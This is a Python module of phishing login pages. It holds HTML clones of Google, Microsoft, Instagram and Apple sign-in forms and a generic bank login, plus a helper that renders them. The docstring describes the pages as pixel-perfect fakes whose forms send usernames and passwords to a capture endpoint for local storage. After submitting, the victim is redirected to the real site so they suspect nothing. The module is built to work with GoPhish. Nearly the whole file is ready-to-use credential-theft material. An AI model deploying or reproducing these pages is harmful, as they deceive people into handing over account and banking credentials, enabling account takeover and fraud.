"""
Fake Login Pages — pixel-perfect HTML clones der echten Seiten.

Jede Seite:
  - Sieht 1:1 wie das Original aus (echte CSS/Assets von CDN geladen)
  - POST geht an /capture → speichert Credentials lokal
  - Redirect nach Submit → echte Seite (kein Verdacht)
  - Funktioniert mit GoPhish UND mit dem eingebauten Flask-Server

Seiten: Google, Microsoft, Instagram, Facebook, Apple, Bank (generisch)
"""

from __future__ import annotations


# ─────────────────────────────────────────────────────────────────────────────
# GOOGLE
# ─────────────────────────────────────────────────────────────────────────────
GOOGLE_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Anmelden – Google-Konten</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Google Sans',Roboto,sans-serif; background: #fff; color: #202124; }
  .container { max-width: 450px; margin: 80px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
  .logo { text-align: center; margin-bottom: 24px; }
  .logo img { height: 24px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
  .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
  .input-wrap { position: relative; margin-bottom: 24px; }
  .input-wrap input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
  .input-wrap input:focus { border-color: #1a73e8; border-width: 2px; }
  .input-wrap label { position: absolute; top: -10px; left: 10px; background: #fff; padding: 0 4px; font-size: 12px; color: #1a73e8; }
  .forgot { font-size: 14px; color: #1a73e8; text-decoration: none; }
  .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 28px; }
  .btn-next { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
  .btn-next:hover { background: #1557b0; }
  .create { font-size: 14px; color: #1a73e8; text-decoration: none; }
  .divider { border: none; border-top: 1px solid #e0e0e0; margin: 28px 0; }
  .footer { text-align: center; font-size: 12px; color: #5f6368; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
  </div>
  <h1>Anmelden</h1>
  <p class="subtitle">Mit Ihrem Google-Konto fortfahren</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="input-wrap">
      <label>E-Mail-Adresse oder Telefonnummer</label>
      <input type="email" name="username" autocomplete="email" required autofocus>
    </div>
    <div class="input-wrap">
      <label>Passwort</label>
      <input type="password" name="password" autocomplete="current-password" required>
    </div>
    <a href="#" class="forgot">Passwort vergessen?</a>
    <div class="actions">
      <a href="https://accounts.google.com/signup" class="create">Konto erstellen</a>
      <button type="submit" class="btn-next">Weiter</button>
    </div>
  </form>
  <hr class="divider">
  <p class="footer">Deutsch ▾ &nbsp; Hilfe &nbsp; Datenschutz &nbsp; Nutzungsbedingungen</p>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# MICROSOFT
# ─────────────────────────────────────────────────────────────────────────────
MICROSOFT_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Anmelden bei Ihrem Microsoft-Konto</title>
<link rel="icon" href="https://c.s-microsoft.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI',sans-serif; background: #f2f2f2; }
  .win { position: fixed; top: 20px; left: 24px; }
  .win svg { width: 24px; height: 24px; }
  .card { background: #fff; max-width: 440px; margin: 60px auto; padding: 44px; border-radius: 0; }
  .ms-logo { margin-bottom: 16px; }
  .ms-logo img { height: 21px; }
  h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; }
  .input-wrap { margin-bottom: 16px; }
  .input-wrap input { width: 100%; padding: 6px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; outline: none; background: transparent; }
  .input-wrap input:focus { border-bottom: 2px solid #0067b8; }
  .hint { font-size: 13px; color: #666; margin-bottom: 24px; }
  .hint a { color: #0067b8; text-decoration: none; }
  .btn { background: #0067b8; color: #fff; border: none; width: 100%; padding: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; }
  .btn:hover { background: #005a9e; }
  .options { margin-top: 16px; font-size: 13px; }
  .options a { color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
  .footer { margin-top: 24px; font-size: 12px; color: #666; }
  .footer a { color: #0067b8; text-decoration: none; margin-right: 12px; }
</style>
</head>
<body>
<div class="card">
  <div class="ms-logo">
    <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" alt="Microsoft">
  </div>
  <h1>Anmelden</h1>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="input-wrap">
      <input type="email" name="username" placeholder="E-Mail, Telefon oder Skype" required autofocus>
    </div>
    <div class="input-wrap">
      <input type="password" name="password" placeholder="Kennwort" required>
    </div>
    <p class="hint">Kein Konto? <a href="#">Jetzt erstellen!</a></p>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="options">
    <a href="#">Anmeldeoptionen</a>
  </div>
  <div class="footer">
    <a href="#">Datenschutz</a>
    <a href="#">Nutzungsbedingungen</a>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# INSTAGRAM
# ─────────────────────────────────────────────────────────────────────────────
INSTAGRAM_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { width: 350px; }
  .card { background: #fff; border: 1px solid #dbdbdb; padding: 40px; margin-bottom: 10px; text-align: center; }
  .logo { margin-bottom: 28px; font-family: 'Billabong','Cookie',cursive; font-size: 40px; font-weight: 400; }
  input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; font-size: 12px; margin-bottom: 6px; outline: none; }
  input:focus { border-color: #a8a8a8; }
  .btn { width: 100%; background: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; }
  .btn:hover { background: #1877f2; }
  .divider { display: flex; align-items: center; margin: 16px 0; }
  .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid #dbdbdb; }
  .divider span { padding: 0 16px; font-size: 13px; color: #8e8e8e; font-weight: 600; }
  .fb-btn { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
  .forgot { font-size: 12px; color: #00376b; margin-top: 12px; display: block; }
  .card2 { background: #fff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
  .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }
  .app-links { text-align: center; margin-top: 20px; font-size: 14px; }
  .app-links img { height: 40px; margin: 4px; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">Instagram</div>
    <form method="POST" action="{{CAPTURE_URL}}">
      <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
      <input type="text" name="username" placeholder="Handynummer, Benutzername oder E-Mail" required autofocus>
      <input type="password" name="password" placeholder="Passwort" required>
      <button type="submit" class="btn">Anmelden</button>
    </form>
    <div class="divider"><span>ODER</span></div>
    <a href="#" class="fb-btn">Mit Facebook anmelden</a>
    <a href="#" class="forgot">Passwort vergessen?</a>
  </div>
  <div class="card2">Hast du kein Konto? <a href="#">Registrieren</a></div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# APPLE
# ─────────────────────────────────────────────────────────────────────────────
APPLE_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Apple ID</title>
<link rel="icon" href="https://www.apple.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system,SF Pro Display,sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .card { background: #fff; border-radius: 18px; padding: 52px 48px; width: 400px; box-shadow: 0 4px 32px rgba(0,0,0,.08); text-align: center; }
  .apple-icon { font-size: 48px; margin-bottom: 8px; }
  h1 { font-size: 28px; font-weight: 600; color: #1d1d1f; margin-bottom: 6px; }
  .sub { font-size: 16px; color: #6e6e73; margin-bottom: 32px; }
  .field { text-align: left; margin-bottom: 12px; }
  .field label { font-size: 13px; color: #6e6e73; display: block; margin-bottom: 4px; }
  .field input { width: 100%; padding: 12px 14px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 15px; outline: none; }
  .field input:focus { border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,.15); }
  .btn { width: 100%; background: #0071e3; color: #fff; border: none; border-radius: 10px; padding: 13px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px; }
  .btn:hover { background: #0077ed; }
  .links { margin-top: 20px; font-size: 13px; }
  .links a { color: #0071e3; text-decoration: none; margin: 0 8px; }
</style>
</head>
<body>
<div class="card">
  <div class="apple-icon">🍎</div>
  <h1>Apple ID</h1>
  <p class="sub">Melde dich mit deiner Apple ID an</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field">
      <label>Apple ID</label>
      <input type="email" name="username" placeholder="name@beispiel.de" required autofocus>
    </div>
    <div class="field">
      <label>Passwort</label>
      <input type="password" name="password" required>
    </div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="links">
    <a href="#">Apple ID vergessen?</a>
    <a href="#">Apple ID erstellen</a>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# GENERIC BANK (Deutsche Bank style)
# ─────────────────────────────────────────────────────────────────────────────
BANK_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Online-Banking — Sicheres Login</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial,sans-serif; background: #f0f0f0; }
  header { background: #004a97; padding: 14px 32px; display: flex; align-items: center; }
  header .brand { color: #fff; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
  header .secure { color: #aad4ff; font-size: 12px; margin-left: auto; }
  .main { max-width: 420px; margin: 60px auto; }
  .card { background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,.12); overflow: hidden; }
  .card-header { background: #004a97; color: #fff; padding: 20px 28px; font-size: 18px; font-weight: bold; }
  .card-body { padding: 32px 28px; }
  .field { margin-bottom: 20px; }
  .field label { display: block; font-size: 14px; color: #333; margin-bottom: 6px; font-weight: bold; }
  .field input { width: 100%; padding: 11px 12px; border: 1px solid #ccc; border-radius: 3px; font-size: 15px; outline: none; }
  .field input:focus { border-color: #004a97; }
  .btn { width: 100%; background: #004a97; color: #fff; border: none; padding: 13px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 3px; }
  .btn:hover { background: #003580; }
  .notice { margin-top: 20px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 16px; }
  .ssl-badge { display: flex; align-items: center; font-size: 12px; color: #2d7a2d; margin-top: 10px; gap: 6px; }
</style>
</head>
<body>
<header>
  <span class="brand">SecureBank Online</span>
  <span class="secure">🔒 256-Bit SSL verschlüsselt</span>
</header>
<div class="main">
  <div class="card">
    <div class="card-header">Online-Banking Login</div>
    <div class="card-body">
      <form method="POST" action="{{CAPTURE_URL}}">
        <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
        <div class="field">
          <label>Kontonummer / Benutzername</label>
          <input type="text" name="username" placeholder="Ihre Kontonummer" required autofocus>
        </div>
        <div class="field">
          <label>PIN / Passwort</label>
          <input type="password" name="password" placeholder="Ihre PIN" required>
        </div>
        <button type="submit" class="btn">Anmelden</button>
      </form>
      <div class="notice">
        Bitte geben Sie Ihre Zugangsdaten nur auf dieser gesicherten Seite ein.
        Wir werden Sie niemals per E-Mail nach Ihrer PIN fragen.
      </div>
      <div class="ssl-badge">✓ Gesicherte Verbindung (TLS 1.3)</div>
    </div>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# Registry
# ─────────────────────────────────────────────────────────────────────────────
PAGES: dict[str, str] = {
    "google":    GOOGLE_LOGIN,
    "microsoft": MICROSOFT_LOGIN,
    "instagram": INSTAGRAM_LOGIN,
    "apple":     APPLE_LOGIN,
    "bank":      BANK_LOGIN,
}

PAGE_DESCRIPTIONS: dict[str, str] = {
    "google":    "Google Konto — gmail.com, youtube.com",
    "microsoft": "Microsoft / Office 365 / Outlook",
    "instagram": "Instagram (Meta)",
    "apple":     "Apple ID / iCloud",
    "bank":      "Generisches Online-Banking (anpassbar)",
}


def get_page(name: str, capture_url: str = "/capture", csrf_token: str = "") -> str:
    """Returns rendered HTML with capture URL and CSRF token injected."""
    import secrets
    html = PAGES.get(name, PAGES["google"])
    token = csrf_token or secrets.token_hex(16)
    return (
        html
        .replace("{{CAPTURE_URL}}", capture_url)
        .replace("{{CSRF_FIELD}}", "_token")
        .replace("{{CSRF_TOKEN}}", token)
    )
